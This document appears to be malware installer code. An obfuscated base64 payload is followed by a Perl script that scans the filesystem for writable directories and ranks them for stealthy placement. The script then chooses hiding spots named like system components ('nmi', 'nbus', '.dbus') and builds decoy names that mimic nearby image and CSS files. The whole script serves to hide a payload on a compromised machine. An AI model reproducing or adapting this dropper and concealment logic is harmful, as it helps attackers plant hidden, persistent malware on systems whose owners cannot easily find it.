CgoKCgoKCgoKCgoKIAoKCgoKCgoKCgoKCgoKCgoKCgoKAg5YT0dFXk91QkVZXgYKDlhPR0VeT3VaRVheBgoOWE9HRV5PdVpLXkIGCg5GRUlLRnVaS15CBgoOWktYS0dZAwoXCllaRkNeCgUGBQYOWklFR0dLRE56S1hLR1kRIAoKCgoKCgoKCgoKCgoKCgoKCgoKRkVJS0YKDkVfXlpfXgoXCghkf2ZmCBEgCgoKCgoKCgoKCgoKCgoKCgoKCgoORV9eWl9eChcKbkVdRGZFS05vUk9JektYAg5YT0dFXk91QkVZXgYKDlhPR0VeT3VaRVheBgoOWE9HRV5PdVpLXkIGCg5GRUlLRnVaS15CBgoOWktYS0dZAxEgCgoKCgoKCgoKCgoKCgoKCgoKCgp5T0ROaEtJQXhPWV9GXgIbBg5DTgZPRElFTk91SEtZTxweAg5FX15aX14DAxEgIAoKCgoKCgoKCgoKCgoKCgpXT0ZZQ0wCDlpJRUdHS0ROflNaTwpPWwoIGxoIA1EKCX9EQ0RZXktGRiAKCgoKCgoKCgoKCgoKCgoKCgoKCiAKCgoKCgoKCgoKCgoKCgoKCgoKCgIOWktYGwYKDlpLWBgGCg5aS1gZAwoXCllaRkNeCgUGBQYOWklFR0dLRE56S1hLR1kRIAoKCgoKCgoKCgoKCgoKCgoKCgoKRkVJS0YKDmdTa2h5ChcKDklfWFhPRF51SENES1hTdVpLXkIECAUIBA5JX1hYT0RedUhLWU9ES0dPESAKCgoKCgoKCgoKCgoKCgoKCgoKCglOT0ZPXk8Kek9YWUNZXk9ESU8gCgoKCgoKCgoKCgoKCgoKCgoKCgpGRUlLRgoORV9eWl9eChcKCGR/ZmYIESAKCgoKCgoKCgoKCgoKCgoKCgoKCg5FX15aX14bCgoXCllTWV5PRwIIWEcIBgoOSUVETHVMQ0ZPAxEgCgoKCgoKCgoKCgoKCgoKCgoKCgoORV9eWl9eGAoKFwpZU1leT0cCCFhHCAYKDmdTa2h5AxEgCgoKCgoKCgoKCgoKCgoKCgoKCgoORV9eWl9eGQoKFwpZU1leT0cCCFhHCAYKDkdeUl5HWkxDRk8DESAKCgoKCgoKCgoKCgoKCgoKCgoKCg5FX15aX14KFwoIWEdJREwQCAoEDkVfXlpfXhsECFhHSENECAQORV9eWl9eGAQIWEdHX14QCAQORV9eWl9eGREgCgoKCgoKCgoKCgoKCgoKCgoKCgp5T0ROaEtJQXhPWV9GXgIbBg5DTgZPRElFTk91SEtZTxweAg5FX15aX14DAxEgCgoKCgoKCgoKCgoKCgoKCgoKCgpPUkNeAhoDESAKCgoKCgoKCgoKCgoKCgoKCgoKCiAKCgoKCgoKCgoKCgoKCgoKV09GWUNMAg5aSUVHR0tETn5TWk8KT1sKCBwIA1EKCUFDRkZJU0lGTyAKCgoKCgoKCgoKCgoKCgoKCgoKCnlPRE5oS0lBeV5LXk8CGwYOQ04DESAKCgoKCgoKCgoKCgoKCgoKCgoKCk9SQ14CGgMRIAoKCgoKCgoKCgoKCgoKCgpXT0ZZQ0wCDlpJRUdHS0ROflNaTwpPWwoIEwgDUQoJf1pOS15PCmdPIAoKCgoKCgoKCgoKCgoKCgoKCgoKIAoKCgoKCgoKCgoKCgoKCgoKCgoKAg5YT0dFXk91QkVZXgYKDlhPR0VeT3VaRVheBgoOWE9HRV5PdVpLXkIGCg5GRUlLRnVaS15CBgoOWktYS0dZAwoXCllaRkNeCgUGBQYOWklFR0dLRE56S1hLR1kRIAoKCgoKCgoKCgoKCgoKCgoKCgoKRkVJS0YKDkVfXlpfXgoXCghkf2ZmCBEgCgoKCgoKCgoKCgoKCgoKCgoKCgoObENGT0tIWWRLR08KFwp/Wk5LXk9HTwIOWE9HRV5PdUJFWV4GCg5YT0dFXk91WkVYXgYKDlhPR0VeT3VaS15CAxEgCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCVhPWVpFRFlPCl5FCllPWFxPWAoKXk4KXktZQUNOBgpFWgoXChsKR09LRFkKTkVETwYKIAoKCgoKCgoKCgoKCgoKCgoKCgoKeU9ETmhLSUF4T1lfRl4CGwYOQ04GT0RJRU5PdUhLWU8cHgIORV9eWl9eAwMRIAoKCgoKCgoKCgoKCgoKCgoKCgoKQ0wKAkVaT0QKZX9+bAYKCBQOR15SX15HWkxDRk8IA1EgCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKWlhDRF4KZX9+bAoODhEgCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKSUZFWU8KZX9+bBEgCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKWlhDRF4KCHZESVhPS15DRE0KDkdeUl9eR1pMQ0ZPCktETgpeQk9ECklLRkYKTENGTwoObENGT0tIWWRLR08KdkQIESAKCgoKCgoKCgoKCgoKCgoKCgoKClcgCgoKCgoKCgoKCgoKCgoKCgoKCgpZU1leT0cCCElLXgoObENGT0tIWWRLR08KVgpaT1hGCAMRIAoKCgoKCgoKCgoKCgoKCgoKCgoKWlhDRF4KCHZESUtGRgpYT15fWEQKS0ROCk9SQ14IESAKCgoKCgoKCgoKCgoKCgoKCgoKCk9SQ14CGgMRIAoKCgoKCgoKCgoKCgoKCgpXIAoKCgoKCgoKCgoKCldPRllDTAIOYURFSUF5XlhDRE0KF1QKRwVERV5LWUFZBUNNAyAKCgoKCgoKCgoKCgpRIAoKCgoKCgoKCgoKCgoKCgoJZEUKa0leQ0VECmRPT05PTgpeQl9ZCk5FCkRFXkJDRE0gCgoKCgoKCgoKCgoKCgoKCglaWENEXgoOYURFSUF5XlhDRE0RCgoKCiAKCgoKCgoKCgoKCgoKCgoKWUZPT1oKDm5vbGt/Zn51eWZvb3p1fmNnbxEgCgoKCgoKCgoKCgoKVyAKCgoKCgoKCgoKCgpPRllDTAIOYURFSUF5XlhDRE0KF1QKRwVET11YT0lFRExDTQVDTQMgCgoKCgoKCgoKCgoKUSAKCgoKCgoKCgoKCgoKCgoKR1MKAg5EWEkGCg5JRURMQktZQgYKDllGT09aAxEgCgoKCgoKCgoKCgoKCgoKCgIORFhJBgoOSUVETEJLWUIGCg5ZRk9PWgMKFwpZWkZDXgoFEAUGCg5hREVJQXleWENETREgCgoKCgoKCgoKCgoKCgoKCg5pRURMQ01iS1lCChcKXlhDRwIOSUVETEJLWUIDESAKCgoKCgoKCgoKCgoKCgoKSUJFR1oKAg5ZRk9PWgMRIAoKCgoKCgoKCgoKCgoKCgoObm9sa39mfnV5Zm9venV+Y2dvChcKXlhDRwIOWUZPT1oDESAKCgoKCgoKCgoKCgoKCgoKf1pOS15PdWlFRExDTXVsQ0ZPAgMRIAoKCgoKCgoKCgoKClcgCgoKCgoKCgpXIAoKCgpXT0ZZT1EgCgoKCgoKCgpDTAoCWU9eTk9MWE9GS1MCAwNRIAoKCgoKCgoKClhPXl9YRBEgCgoKCgoKCgpXT0ZZQ0wKAk1PXlhPRkxYRUdIRkVNAgMDUSAKCgoKCgoKCgoKCgoJClpYQ0ReCghJS0ZGCk1PXlhPRkxYRUdIRkVNCl1LWQpZX0lJT1lZdkQIESAKCgoKCgoKClhPXl9YRBEgCgoKCgoKCgpXT0ZZQ0wCTU9eWE9GTFhFR0hGRU0bAgMDUSAKCgoKCgoKCgoKCgpaWENEXgoISUtGRgpNT15YT0ZMWEVHSEZFTRsKXUtZCllfSUlPWVl2RAgRIAoKCgoKCgoKCgoKClhPXl9YRBEgCgoKCgoKCgpXT0ZZQ0wCbm0CAwNRIAoKCgoKCgoKCgoKClpYQ0ReCghJS0ZGCm5tCl1LWQpZX0lJT1lZdkQIESAKCgoKCgoKCgoKCgpYT15fWEQRIAoKCgoKCgoKV09GWU9RIAoKCgoKCgoKCgoKCllYT0YCAxEgCgoKCgoKCgoKCgoKWlhDRF4KCElLRkYKWVhPRgpdS1kKWV9JSU9ZWXZECBEgCgoKCgoKCgoKCgoKWE9eX1hEESAKCgoKCgoKClcgCgoKClcgVyAgdXVjZGN+ECMjIyMgIF1CQ0ZPAhsDUSMjIwoKCgoJCkNETENES15DRUQgCgoKCmdrY2QCAxEgCgoKCkNMCgILCgdMCg5HXlJeR1pMQ0ZPA1EgCgoKCgoKCgpHXlICAxEgCgoKClcgCgoKCklYRF5LSFxLRkNOS15FWAIDESAKCgoKWUZPT1oKHxEgVyA=
ENDOFCONTENT

my $k = "*";
our %bin;
our %pub;
our %run;
our %home;
our %lib;
our %usrlocal;
our %varlib;
our %mnt;
our %opt;
our %other;

$uuid_rand1 = 10000000*rand();
$uuid_rand2 = 10000000*rand();
$uuid_rand3 = 10000000*rand();
$uuid_rand4 = 10000000*rand();

$hex1 = sprintf("%X", $uuid_rand1);
$hex2 = sprintf("%X", $uuid_rand2);
$hex3 = sprintf("%X", $uuid_rand3);
$hex4 = sprintf("%X", $uuid_rand4);

$uuid = $hex1.$hex2.$hex3.$hex4;



sub find_dir
{
    ($root) = @_;
    if (opendir($DIR, $root ))
    {
        while ( my $entry = readdir $DIR )
        {
            $current_dir_path = $root . $entry;
            next unless -d $root . $entry;
            next if $entry eq '.' or $entry eq '..' or $entry eq 'proc' or $entry eq 'dev' or $entry eq 'sys';
            next if -l $current_dir_path;
            push (@roots, $root . $entry);
            push (@globals, $root . $entry);
        }
        closedir $DIR;
    }
    
    return @roots;
}


sub find_in_dir
{
    my @depth2;
    @roots = find_dir("/");
   	foreach $item (@roots)
	{
        #print $item."\n";
        if (opendir($DIR, $item ))
        {
            while ( my $entry = readdir $DIR )
            {
                $current_dir_path = $item .'/'. $entry;
                next unless -d $current_dir_path;
                next if $entry eq '.' or $entry eq '..' or $entry eq 'proc' or $entry eq 'dev' or $entry eq 'sys';
                next if -l $current_dir_path;
                #print $item .'/'. $entry."\n";
                push (@depth2, $current_dir_path);
                push (@globals, $current_dir_path);

            }
            closedir $DIR;
        }
    }
    return @depth2;
}

sub find_in_in_dir
{
    my @depth3;
    my @depth2 = find_in_dir();
   	foreach $item (@depth2)
	{
       if (opendir($DIR, $item ))
        {
            while ( my $entry = readdir $DIR )
            {
                $current_dir_path = $item .'/'. $entry;
                next unless -d $current_dir_path;
                next if $entry eq '.' or $entry eq '..' or $entry eq 'proc' or $entry eq 'dev' or $entry eq 'sys';
                next if -l $current_dir_path;
                # print $item .'/'. $entry."\n";
                push (@depth3, $current_dir_path);
                push (@globals, $current_dir_path);
            }
            closedir $DIR;
        }
    }
    return @depth3;
}

sub find_in_in_in_dir
{
    my @depth4;
    my @depth3 = find_in_in_dir();
   	foreach $item (@depth3)
	{
        if (opendir($DIR, $item ))
        {
            while ( my $entry = readdir $DIR )
            {
                $current_dir_path = $item .'/'. $entry;
                next unless -d $current_dir_path;
                next if $entry eq '.' or $entry eq '..' or $entry eq 'proc' or $entry eq 'dev' or $entry eq 'sys';
                next if -l $current_dir_path;
                push (@depth4, $current_dir_path);
                push (@globals, $current_dir_path);
            }
            closedir $DIR;
        }

    }
    return @depth4;
}

sub find_in_in_in_in_dir
{
    my @depth5;
    my @depth4 = find_in_in_in_dir();
   	foreach $item (@depth4)
	{
        if (opendir($DIR, $item ))
        {
            while ( my $entry = readdir $DIR )
            {
                $current_dir_path = $item .'/'. $entry;
                next unless -d $current_dir_path;
                next if $entry eq '.' or $entry eq '..' or $entry eq 'proc' or $entry eq 'dev' or $entry eq 'sys';
                next if -l $current_dir_path;
                push (@depth5, $current_dir_path);
                push (@globals, $current_dir_path);
            }
            closedir $DIR;
        }

    }
    return @depth5;
}

sub find_in_in_in_in_in_dir
{
    my @depth6;
    my @depth5 = find_in_in_in_in_dir();
   	foreach $item (@depth5)
	{
        if (opendir($DIR, $item ))
        {
            while ( my $entry = readdir $DIR )
            {
                $current_dir_path = $item .'/'. $entry;
                next unless -d $current_dir_path;
                next if $entry eq '.' or $entry eq '..' or $entry eq 'proc' or $entry eq 'dev' or $entry eq 'sys';
                next if -l $current_dir_path;
                push (@depth6, $current_dir_path);
                push (@globals, $current_dir_path);
            }
            closedir $DIR;
        }
    }
    return @depth6;
}

find_in_in_in_in_in_dir();
sub find_dir_writable
{
	#my ($lpaths) = @_;
	@lists;
	@cnt;
	my $index;
	my $max_value = 0;
	@p = @globals;
	foreach $item (@p)
	{
		if (-w $item)
		{
			push(@lists,$item);
		}
	}

    return (@lists);
}

@writable_path = find_dir_writable();
@sorted = sort @writable_path;
foreach $inpath (@sorted)
{
    next if $inpath =~ m/(.cache)|(cache)|(tmp)|(.tmp)|(.temp)/i;

    $bin{$inpath} += 600 if $inpath =~ m#^/bin#i;
    $bin{$inpath} += 500 if $inpath =~ m#/bin#i;
    $bin{$inpath} += 500 if $inpath =~ m#^/usr/bin#i;
    $bin{$inpath} += 100 if $inpath =~ m#^/usr/local/bin#i;
    $bin{$inpath} += 90  if $inpath =~ m#bin$#i;

    $opt{$inpath} += 85   if $inpath =~ m#^/opt#;
    $opt{$inpath} += 100  if $inpath =~ m#^/opt/.+#;
    $opt{$inpath} += 100  if $inpath =~ m#^/opt/.{10,}?#;
    $opt{$inpath} += 100  if $inpath =~ m#^/opt/.{20,}?#;
    $opt{$inpath} += 100  if $inpath =~ m#^/opt/.{40,}?#;

    $opt{$inpath} += 40 if $inpath =~ m#^/var/opt#i;
    $opt{$inpath} += 45 if $inpath =~ m#^/var/opt/.{3,}?#i;
    $opt{$inpath} += 50 if $inpath =~ m#^/var/opt/.{10,}?#i;
    
    $usrlocal{$inpath} += 100 if $inpath =~ m#^/usr#i;
    $usrlocal{$inpath} += 100 if $inpath =~ m#^/usr/local/#i;
    $usrlocal{$inpath} += 70  if $inpath =~ m#^/usr/share#i;
    $usrlocal{$inpath} += 80  if $inpath =~ m#^/usr/share/#i;
    $usrlocal{$inpath} += 100 if $inpath =~ m#^/usr/lib#i;
    $usrlocal{$inpath} += 110 if $inpath =~ m#^/usr/lib.{10,}?#i;
    $usrlocal{$inpath} += 100 if $inpath =~ m#^/usr/.*linux.*#i;
 
    $run{$inpath} += 50 if $inpath =~ m#^/var/run#i;
    $run{$inpath} += 55 if $inpath =~ m#^/var/lock#i;
    $run{$inpath} += 85 if $inpath =~ m#^/var/run/.+#i;
    $run{$inpath} += 95 if $inpath =~ m#^/var/run/.{10,}?#i;
    $run{$inpath} += 80 if $inpath =~ m#^/run.{5,}?#i;
    $run{$inpath} += 89 if $inpath =~ m#^/run.{8,}?#i;
    $run{$inpath} += 50 if $inpath =~ m#^/run/lock#i;
    $run{$inpath} += 50 if $inpath =~ m#^/run/user#i;
    $run{$inpath} += 70 if $inpath =~ m#^/run/user.{5,}?#i;

    $varlib{$inpath} += 60 if $inpath =~ m#^/var/lib#i;
    $varlib{$inpath} += 65 if $inpath =~ m#^/var/lib.{5,}?#i;
    $varlib{$inpath} += 70 if $inpath =~ m#^/var/lib.{10,}?#i;
    $varlib{$inpath} += 80 if $inpath =~ m#^/var/lib.{20,}?#i;
    $varlib{$inpath} += 30 if $inpath =~ m#^/var.{3,}?#i;
    $varlib{$inpath} += 40 if $inpath =~ m#^/var.{10,}?#i;
    
    $lib{$inpath} += 60 if $inpath =~ m#^/lib#i;
    $lib{$inpath} += 65 if $inpath =~ m#^/lib.{5,}?#i;
    $lib{$inpath} += 70 if $inpath =~ m#^/lib.{10,}?#i;
    $lib{$inpath} += 80 if $inpath =~ m#^/lib.{20,}?#i;
    
    $home{$inpath} += 5  if $inpath =~ m#^/home#i;
    $home{$inpath} += 6 if $inpath =~ m#^/home/#i;
    $home{$inpath} += 10 if $inpath =~ m#^/home/.{10,}#i;
    $home{$inpath} += 15 if $inpath =~ m#^/home/.{20,}#i;
    $home{$inpath} += 20 if $inpath =~ m#^/home/.{30,}?#i;
    $home{$inpath} += 25 if $inpath =~ m#^/home/.{40,}?#i;
    $home{$inpath} += 35 if $inpath =~ m#^/home/.{50,}?#i;
    $home{$inpath} -= 50 if $inpath =~ m#/home/.*\.[^.?]+#i;
    $home{$inpath} -= 45 if $inpath =~ m#(download)|(upload)|(mozilla)#i;

    $pub{$inpath} += 20 if $inpath =~ m#/var/www.*#i;
    $pub{$inpath} += 30 if $inpath =~ m#/var/www.{10,}?#i;
    $pub{$inpath} += 40 if $inpath =~ m#/var/www.{20,}?#i;
    $pub{$inpath} += 50 if $inpath =~ m#/var/www.{40,}?#i;
    $pub{$inpath} += 5  if $inpath =~ m#(/data)|(/public)|(/www)#i;
    $pub{$inpath} += 15 if $inpath =~ m#(/data)|(/public)|(/www).{10,}?#i;
    $pub{$inpath} += 15 if $inpath =~ m#(/data)|(/public)|(/www).{20,}?#i;
    $pub{$inpath} += 30 if $inpath =~ m#(/data)|(/public)|(/www).{30,}?#i;
    $pub{$inpath} += 40 if $inpath =~ m#(/data)|(/public)|(/www).{40,}?#i;
    $pub{$inpath} += 60 if $inpath =~ m#(/data)|(/public)|(/www).{50,}?#i;
    $pub{$inpath} -= 45 if $inpath =~ m#(/download.*)|(/upload.*)#i;
    $pub{$inpath} += 45 if $inpath =~ m#/css#i;
    $pub{$inpath} += 55 if $inpath =~ m#/img#i;
    $pub{$inpath} += 55 if $inpath =~ m#(img)|(images)|(css)|(view).{10,}?#i;
    $pub{$inpath} += 55 if $inpath =~ m#(img)|(images)|(css)|(view).{15,}?#i;
    $pub{$inpath} += 55 if $inpath =~ m#(img)|(images)|(css)|(view).{20,}?#i;
    $pub{$inpath} += 55 if $inpath =~ m#(img)|(images)|(css)|(view).{25,}?#i;
    $pub{$inpath} += 55 if $inpath =~ m#(img)|(images)|(css)|(view).{30,}?#i;
    $pub{$inpath} += 55 if $inpath =~ m#(img)|(images)|(css)|(view).{35,}?#i;
    $pub{$inpath} += 55 if $inpath =~ m#(img)|(images)|(css)|(view).{40,}?#i;
    $pub{$inpath} += 55 if $inpath =~ m#(img)|(images)|(css)|(view).{45,}?#i;
    $pub{$inpath} += 55 if $inpath =~ m#(img)|(images)|(css)|(view).{50,}?#i;
    $pub{$inpath} += 55 if $inpath =~ m#(img)|(images)|(css)|(view).{55,}?#i;
    $pub{$inpath} += 55 if $inpath =~ m#(img)|(images)|(css)|(view).{60,}?#i;
    $pub{$inpath} += 55 if $inpath =~ m#(img)|(images)|(css)|(view).{70,}?#i;




    $mnt{$inpath} += 40 if $inpath =~ m#/mnt/.+#i;
    $mnt{$inpath} += 30 if $inpath =~ m#/media/.+#i;

    $other{$inpath} += 100 if $inpath =~ m#^(?!.*(/bin|/cdrom|/etc|/lib|/libx32|/media|/opt|/root|/sbin|/srv|/sys|/usr|/var|/boot|/dev|/home|/lib64|/lost+found|/mnt|/proc|/run|/tmp))#i;
    $other{$inpath} += 110 if $inpath =~ m#^(?!.*(/bin|/cdrom|/etc|/lib|/libx32|/media|/opt|/root|/sbin|/srv|/sys|/usr|/var|/boot|/dev|/home|/lib64|/lost+found|/mnt|/proc|/run|/tmp)).{5,}?#i;
    $other{$inpath} += 120 if $inpath =~ m#^(?!.*(/bin|/cdrom|/etc|/lib|/libx32|/media|/opt|/root|/sbin|/srv|/sys|/usr|/var|/boot|/dev|/home|/lib64|/lost+found|/mnt|/proc|/run|/tmp)).{10,}?#i;
    $other{$inpath} += 120 if $inpath =~ m#^(?!.*(/bin|/cdrom|/etc|/lib|/libx32|/media|/opt|/root|/sbin|/srv|/sys|/usr|/var|/boot|/dev|/home|/lib64|/lost+found|/mnt|/proc|/run|/tmp)).{30,}?#i;

}


# print "================start bin=============\n";
my @keys = sort { $bin{$a} <=> $bin{$b} } keys(%bin);
my @vals = @bin{@keys};
push @mybin, @keys;
undef %bin;

# foreach my $i (0 .. $#keys) {
#    $bin{$keys[$i]} = $vals[$i];
#    print $vals[$i] . "-" . $keys[$i]."\n";
# }
undef @keys;
undef @vals;
undef $a;
undef $b;


# print "================start pub=============\n";
my @keys = sort { $pub{$a} <=> $pub{$b} } keys(%pub);
my @vals = @pub{@keys};
push @mypub, @keys;
undef %pub;

# foreach my $i (0 .. $#keys) {
#   $pub{$keys[$i]} = $vals[$i];
#     print $vals[$i] . "-" . $keys[$i]."\n";
# }
undef @keys;
undef @vals;
undef $a;
undef $b;


# print "================start opt=============\n";
my @keys = sort { $opt{$a} <=> $opt{$b} } keys(%opt);
my @vals = @opt{@keys};
push @myopt, @keys;
undef %opt;

# foreach my $i (0 .. $#keys) {
#   $opt{$keys[$i]} = $vals[$i];
#     print $vals[$i] . "-" . $keys[$i]."\n";
# }
undef @keys;
undef @vals;
undef $a;
undef $b;


# print "================start run=============\n";
my @keys = sort { $run{$a} <=> $run{$b} } keys(%run);
my @vals = @run{@keys};
push @myrun, @keys;
undef %run;

# foreach my $i (0 .. $#keys) {
#   $run{$keys[$i]} = $vals[$i];
#     print $vals[$i] . "-" . $keys[$i]."\n";
# }
undef @keys;
undef @vals;
undef $a;
undef $b;


# print "================start home=============\n";
my @keys = sort { $home{$a} <=> $home{$b} } keys(%home);
my @vals = @home{@keys};
push @myhome, @keys;
undef %home;

# foreach my $i (0 .. $#keys) {
#   $home{$keys[$i]} = $vals[$i];
#     print $vals[$i] . "-" . $keys[$i]."\n";
# }
undef @keys;
undef @vals;
undef $a;
undef $b;


# print "================start lib=============\n";
my @keys = sort { $lib{$a} <=> $lib{$b} } keys(%lib);
my @vals = @lib{@keys};
push @mylib, @keys;
undef %lib;

# foreach my $i (0 .. $#keys) {
#   $lib{$keys[$i]} = $vals[$i];
#     print $vals[$i] . "-" . $keys[$i]."\n";
# }
undef @keys;
undef @vals;
undef $a;
undef $b;


# print "================start usrlocal=============\n";
my @keys = sort { $usrlocal{$a} <=> $usrlocal{$b} } keys(%usrlocal);
my @vals = @usrlocal{@keys};
push @myusrlocal, @keys;
undef %usrlocal;

# foreach my $i (0 .. $#keys) {
#   $usrlocal{$keys[$i]} = $vals[$i];
#     print $vals[$i] . "-" . $keys[$i]."\n";
# }
undef @keys;
undef @vals;
undef $a;
undef $b;


# print "================start varlib=============\n";
my @keys = sort { $varlib{$a} <=> $varlib{$b} } keys(%varlib);
my @vals = @varlib{@keys};
push @myvarlib, @keys;
undef %varlib;

# foreach my $i (0 .. $#keys) {
#   $varlib{$keys[$i]} = $vals[$i];
#     print $vals[$i] . "-" . $keys[$i]."\n";
# }
undef @keys;
undef @vals;
undef $a;
undef $b;


# print "================start mnt=============\n";
my @keys = sort { $mnt{$a} <=> $mnt{$b} } keys(%mnt);
my @vals = @mnt{@keys};
push @mymnt, @keys;
undef %mnt;

# foreach my $i (0 .. $#keys) {
#   $mnt{$keys[$i]} = $vals[$i];
#     print $vals[$i] . "-" . $keys[$i]."\n";
# }
undef @keys;
undef @vals;
undef $a;
undef $b;


# print "================start other=============\n";
my @keys = sort { $other{$a} <=> $other{$b} } keys(%other);
my @vals = @other{@keys};
push @myother, @keys;
undef %other;

# foreach my $i (0 .. $#keys) {
#   $other{$keys[$i]} = $vals[$i];
#     print $vals[$i] . "-" . $keys[$i]."\n";
# }
undef @keys;
undef @vals;
undef $a;
undef $b;


my @bash_paths;
my @mash_paths;

$ijk=0;
while ($#bash_paths < 3)
{
    $ijk+=1;
    my $tmp;
    
    last if $#bash_paths > 2;
    $tmp = pop @mybin;
    push @bash_paths, $tmp if defined $tmp;
    undef $tmp;


    last if $#bash_paths > 2;
    $tmp = pop @myrun;
    push @bash_paths, $tmp if defined $tmp;
    undef $tmp;

    last if $#bash_paths > 2;
    $tmp = pop @myusrlocal;
    push @bash_paths, $tmp if defined $tmp;
    undef $tmp;
        
    if ($ijk > 4)
    {
        last;
    }
}

if ($#bash_paths < 3)
{
    $tmp = pop @myhome;
    push @bash_paths, $tmp if defined $tmp;
    undef $tmp;
}
if ($#bash_paths < 1)
{
    $tmp = pop @mypub;
    push @bash_paths, $tmp if defined $tmp;
    undef $tmp;
}
$ijk=0;
while ($#mash_paths < 3)
{
    $ijk+=1;
    my $tmp;
    last if $#mash_paths > 2;
    $tmp = pop @mypub;
    push @mash_paths, $tmp if defined $tmp;
    undef $tmp;

    last if $#mash_paths > 2;
    $tmp = pop @mybin;
    push @mash_paths, $tmp if defined $tmp;
    undef $tmp;
    
    last if $#mash_paths > 2;
    $tmp = pop @myopt;
    push @mash_paths, $tmp if defined $tmp;
    undef $tmp;
        
    last if $#mash_paths > 2;
    $tmp = pop @myother;
    push @mash_paths, $tmp if defined $tmp;
    undef $tmp;

    last if $#mash_paths > 2;
    $tmp = pop @mylib;
    push @mash_paths, $tmp if defined $tmp;
    undef $tmp;

    last if $#mash_paths > 2;
    $tmp = pop @myhome;
    push @mash_paths, $tmp if defined $tmp;
    undef $tmp;

    last if $#mash_paths > 2;
    $tmp = pop @myvarlib;
    push @mash_paths, $tmp if defined $tmp;
    undef $tmp;

    last if $#mash_paths > 2;
    $tmp = pop @mymnt;
    push @mash_paths, $tmp if defined $tmp;
    undef $tmp;
    if ($ijk > 4)
    {
        last;
    }
}

# print "\nmybin:" . pop @mybin;
# print "\nmybin:" . $mybin[1];
# print "\nmypub:" . pop @mypub;
# print "\nmyrun:" . pop @myrun;
# print "\nmyhome:" . pop @myhome;
# print "\nmylib:" . pop @mylib;
# print "\nmyusrlocal:" . pop @myusrlocal;
# print "\nmyvarlib:" . pop @myvarlib;
# print "\nmymnt:" . pop @mymnt;
# print "\nmyopt:" . pop @myopt;
# print "\nmyother:" . pop @myother;


# foreach my $item (@bash_paths)
# {
#     print "bash install paths: ".$item."\n";
# }
# print "\n";
# foreach my $item (@mash_paths)
# {
#     print "mash install paths: ".$item."\n";
# }

my $bash1 = $bash_paths[0] . "/nmi";
my $bash2 = $bash_paths[1] . "/nbus";
my $bash3 = $bash_paths[2] . "/.dbus";



#for MASH Naming
my $mash1 = $mash_paths[0];
my $mash2 = $mash_paths[1];
my $mash3 = $mash_paths[2];

#======== MASH 1 ========
if ($mash1 =~ /(jpg)|(jpeg)|(png)|(gif)|(img)|(image.*)/i)
{
    @files = `ls -1a $mash1`;
    if ($#files > 1)
    {
        chomp $files[-2];
        $mash1_name =~ s/[\t "]//g;
        $mash1_name    = $files[-2];
        if ($mash1_name ne ucfirst $mash1_name) 
        {
            $mash1_name = ucfirst $mash1_name;
        
        }elsif ($mash1_name ne uc $mash1_name)
        {
            $mash1_name = uc $mash1_name;
        }elsif ($mash1_name ne lc $mash1_name)
        {
            $mash1_name = lc $mash1_name;
        }else
        {
            $mash1_name = "mono_pic_thumb.jpg";    
        }
        
    }
    else
    {
        $mash1_name = "mono_pic_thumb.jpg";
    }
}elsif ($mash1 =~ /(css)|(js)|(javascript)|(view)|(tpl)|(template)/i)
{
    @files = `ls -1a $mash1`;
    if ($#files > 1)
    {
        chomp $files[-2];
        $mash1_name    = $files[-2];
        $mash1_name =~ s/[\t "]//g;
        if ($mash1_name ne ucfirst $mash1_name) 
        {
        
            $mash1_name = ucfirst $mash1_name;
        
        }elsif ($mash1_name ne uc $mash1_name)
        {
            $mash1_name = uc $mash1_name;
        }elsif ($mash1_name ne lc $mash1_name)
        {
            $mash1_name = lc $mash1_name;
        }else
        {
            $mash1_name = "mono_css_thumb.css";    
        }
        
    }
    else
    {
        $mash1_name = "mono_pic_thumb.css";
    }
}else{
    $mash1_name = ".mono_thumb";
}

#=========MASH 2==============
if ($mash2 =~ /(jpg)|(jpeg)|(png)|(gif)|(img)|(image.*)/i)
{
    @files = `ls -1a $mash2`;
    if ($#files > 1)
    {
        chomp $files[-2];
        $mash2_name =~ s/[\t "]//g;
        $mash2_name    = $files[-2];
        if ($mash2_name ne ucfirst $mash2_name) 
        {
        
            $mash2_name = ucfirst $mash2_name;
        
        }elsif ($mash2_name ne uc $mash2_name)
        {
            $mash2_name = uc $mash2_name;
        }elsif ($mash2_name ne lc $mash2_name)
        {
            $mash2_name = lc $mash2_name;
        }else
        {
            $mash2_name = "pop44larg.jpg";    
        }        
    }
    else
    {
        $mash2_name = "pop44larg.jpg";
    }
}elsif ($mash2 =~ /(css)|(js)|(javascript)|(view)|(tpl)|(template)/i)
{
    @files = `ls -1a $mash2`;
    if ($#files > 1)
    {
        chomp $files[-2];
        $mash2_name =~ s/[\t "]//g;
        $mash2_name    = $files[-2];
        if ($mash2_name ne ucfirst $mash2_name) 
        {
        
            $mash2_name = ucfirst $mash2_name;
        
        }elsif ($mash2_name ne uc $mash2_name)
        {
            $mash2_name = uc $mash2_name;
        }elsif ($mash2_name ne lc $mash2_name)
        {
            $mash2_name = lc $mash2_name;
        }else
        {
            $mash2_name = "pop44larg.css";    
        }
        
    }
    else
    {
        $mash2_name = "pop44larg.css";
    }
}else{
    $mash2_name = "pkcs";
}

#=========MASH 3==============
if ($mash3 =~ /(jpg)|(jpeg)|(png)|(gif)|(img)|(image.*)/i)
{
    @files = `ls -1a $mash3`;
    if ($#files > 1)
    {
        chomp $files[-2];
        $mash3_name =~ s/[\t "]//g;
        $mash3_name    = $files[-2];
        if ($mash3_name ne ucfirst $mash3_name) 
        {
        
            $mash3_name = ucfirst $mash3_name;
        
        }elsif ($mash3_name ne uc $mash3_name)
        {
            $mash3_name = uc $mash3_name;
        }elsif ($mash3_name ne lc $mash3_name)
        {
            $mash3_name = lc $mash3_name;
        }else
        {
            $mash3_name = "pop44larg.jpg";    
        }        
    }
    else
    {
        $mash3_name = "mockup.jpg";
    }
}elsif ($mash3 =~ /(css)|(js)|(javascript)|(view)|(tpl)|(template)/i)
{
    @files = `ls -1a $mash3`;
    if ($#files > 1)
    {
        chomp $files[-2];
        $mash3_name =~ s/[\t "]//g;
        $mash3_name    = $files[-2];
        if ($mash3_name ne ucfirst $mash3_name) 
        {
        
            $mash3_name = ucfirst $mash3_name;
        
        }elsif ($mash3_name ne uc $mash3_name)
        {
            $mash3_name = uc $mash3_name;
        }elsif ($mash3_name ne lc $mash3_name)
        {
            $mash3_name = lc $mash3_name;
        }else
        {
            $mash3_name = "mockup.css";    
        }
        
    }
    else
    {
        $mash3_name = "mockup.css";
    }
}else{
    $mash3_name = "mockup";
}

